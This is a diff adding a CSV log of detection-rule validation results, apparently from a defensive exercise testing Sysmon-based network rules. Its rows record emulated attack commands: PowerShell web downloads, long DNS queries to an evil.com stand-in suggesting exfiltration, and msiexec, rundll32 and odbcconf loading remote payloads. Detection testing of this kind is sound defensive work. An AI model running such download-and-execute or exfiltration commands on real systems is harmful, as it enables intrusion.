@@ -1,0 +1,29 @@
+rule_id,attack_path,field_values_used,result,reason,timestamp_utc
+NET_POWERSHELL_HTTP_001,Path A,powershell.exe;initiated=true;destination_port=443;destination_hostname=null;Invoke-WebRequest https://8.8.4.4/,PASS,4 hits,2026-08-12T15:04:00.481604
+NET_POWERSHELL_HTTP_001,Path B,powershell.exe;initiated=true;destination_port=80;destination_hostname=null;Invoke-WebRequest http://8.8.8.8/,FAIL,0 hits,2026-08-12T15:05:03.962222
+NET_POWERSHELL_HTTP_001,Path C,powershell.exe;initiated=true;destination_port=443;destination_hostname=null;WebClient.DownloadString https://8.8.4.4/,PASS,4 hits,2026-08-12T15:08:21.457201
+NET_POWERSHELL_HTTP_001,FP_SUPPRESSION,powershell.exe;Invoke-WebRequest http://www.microsoft.com/ (excluded .microsoft.com),FAIL,1 hits for excluded hostname www.microsoft.com,2026-08-12T15:09:04.510027
+NET_DNS_LONG_QUERY_001,Path A,powershell.exe;[System.Net.Dns]::GetHostEntry;query_name=shadowsensor-a0a0a0a0a0a0a0a0a0a0a0a0a0a0a0a0a0a0a0a0a0a0a0.evil.com (68 chars),PASS,2 hits,2026-08-12T15:09:17.122920
+NET_DNS_LONG_QUERY_001,Path B,powershell.exe;Resolve-DnsName;query_name=shadowsensor-a0a0a0a0a0a0a0a0a0a0a0a0a0a0a0a0a0a0a0a0a0a0a0.evil.com (68 chars),PASS,2 hits,2026-08-12T15:10:08.151163
+NET_DNS_LONG_QUERY_001,Path C,nslookup.exe;query_name=shadowsensor-a0a0a0a0a0a0a0a0a0a0a0a0a0a0a0a0a0a0a0a0a0a0a0.evil.com (68 chars),FAIL,0 hits; substituted nslookup.exe for custom binary (rule_insights Path C),2026-08-12T15:11:00.185969
+NET_DNS_SCRIPT_ENGINE_001,Path A,wscript.exe;ss_dns_long.vbs;query_name=shadowsensor-a0a0a0a0a0a0a0a0a0a0a0a0a0a0a0a0a0a0a0a0a0a0a0.evil.com,INCONCLUSIVE,D29: script engine telemetry gap — not a rule defect,2026-08-12T15:14:08.120726
+NET_DNS_SCRIPT_ENGINE_001,Path B,cscript.exe;ss_dns_long.vbs;query_name=shadowsensor-a0a0a0a0a0a0a0a0a0a0a0a0a0a0a0a0a0a0a0a0a0a0a0.evil.com,INCONCLUSIVE,D29: script engine telemetry gap — not a rule defect,2026-08-12T15:17:13.994661
+NET_DNS_SCRIPT_ENGINE_001,Path C,mshta.exe;ss_dns_long_mshta.hta;query_name=shadowsensor-a0a0a0a0a0a0a0a0a0a0a0a0a0a0a0a0a0a0a0a0a0a0a0.evil.com,PARTIAL,1 hits,2026-08-12T15:20:19.332420
+NET_SCRIPTING_ENGINE_HTTP_001,Path A,wscript.exe;initiated=true;destination_port=443;ss_winhttp443.vbs → https://8.8.4.4/,PASS,2 hits,2026-08-12T15:20:59.398739
+NET_SCRIPTING_ENGINE_HTTP_001,Path B,cscript.exe;initiated=true;destination_port=80;ss_winhttp80.vbs → http://8.8.8.8/,INCONCLUSIVE,D29: script engine telemetry gap — not a rule defect,2026-08-12T15:21:40.310748
+NET_SCRIPTING_ENGINE_HTTP_001,Path C,wscript.exe;initiated=true;destination_port=80;ss_winhttp80.vbs → http://8.8.8.8/,INCONCLUSIVE,D29: script engine telemetry gap — not a rule defect,2026-08-12T15:24:53.944721
+NET_SCRIPT_ENGINE_OUTBOUND_001,Path A,wscript.exe;initiated=true;ss_winhttp80.vbs → http://8.8.8.8/,INCONCLUSIVE,D29: script engine telemetry gap — not a rule defect,2026-08-12T15:28:07.337539
+NET_SCRIPT_ENGINE_OUTBOUND_001,Path B,cscript.exe;initiated=true;ss_winhttp80.vbs → http://8.8.8.8/,INCONCLUSIVE,D29: script engine telemetry gap — not a rule defect,2026-08-12T15:31:21.020597
+NET_SCRIPT_ENGINE_OUTBOUND_001,Path C,mshta.exe;initiated=true;ss_mshta80.hta → http://8.8.8.8/,FAIL,0 hits,2026-08-12T15:34:33.581602
+NET_LOLBIN_PROCESS_HTTP_001,Path A,mshta.exe;initiated=true;destination_port=443;ss_mshta443.hta → https://8.8.4.4/,FAIL,0 hits; cmd.exe substituted — mshta used (cmd cannot initiate TCP),2026-08-12T15:37:46.705812
+NET_LOLBIN_PROCESS_HTTP_001,Path B,msiexec.exe;/i http://8.8.8.8/a.msi /qn;initiated=true;destination_port=80,INCONCLUSIVE,D-b: process uses WinINet internally — EID-3 not generated; cmd.exe substituted — msiexec used,2026-08-12T15:40:52.699301
+NET_LOLBIN_PROCESS_HTTP_001,Path C,"rundll32.exe;http://8.8.8.8/a.dll,Entry;initiated=true;destination_port=80",INCONCLUSIVE,D-b: process uses WinINet internally — EID-3 not generated; cmd.exe substituted — rundll32 used,2026-08-12T15:44:18.283602
+NET_LOLBIN_NETWORK_001,Path A,mshta.exe;initiated=true;ss_mshta80.hta → http://8.8.8.8/,FAIL,0 hits,2026-08-12T15:48:02.691971
+NET_LOLBIN_NETWORK_001,Path B,msiexec.exe;/i http://8.8.8.8/b.msi /qn;initiated=true,INCONCLUSIVE,D-b: process uses WinINet internally — EID-3 not generated,2026-08-12T15:51:15.574643
+NET_LOLBIN_NETWORK_001,Path C,odbcconf.exe;/f http://8.8.8.8/a.rsp;initiated=true,PASS,4 hits,2026-08-12T15:55:01.467931
+NET_SUSPICIOUS_PORT_001,Path A,initiated=true;destination_port=4444/1337/8888,SKIP,D28: Sysmon EID-3 captures only ports 80/443 — structurally unfireable,2026-08-12T15:56:09.577483
+NET_SUSPICIOUS_PORT_001,Path B,initiated=true;destination_port=4444/1337/8888,SKIP,D28: Sysmon EID-3 captures only ports 80/443 — structurally unfireable,2026-08-12T15:56:09.577537
+NET_SUSPICIOUS_PORT_001,Path C,initiated=true;destination_port=4444/1337/8888,SKIP,D28: Sysmon EID-3 captures only ports 80/443 — structurally unfireable,2026-08-12T15:56:09.577568
+NET_SMB_LATERAL_001,Path A,initiated=true;destination_port=445/139,SKIP,D28: Sysmon EID-3 captures only ports 80/443 — structurally unfireable,2026-08-12T15:56:09.590268
+NET_SMB_LATERAL_001,Path B,initiated=true;destination_port=445/139,SKIP,D28: Sysmon EID-3 captures only ports 80/443 — structurally unfireable,2026-08-12T15:56:09.590331
+NET_SMB_LATERAL_001,Path C,initiated=true;destination_port=445/139,SKIP,D28: Sysmon EID-3 captures only ports 80/443 — structurally unfireable,2026-08-12T15:56:09.590357
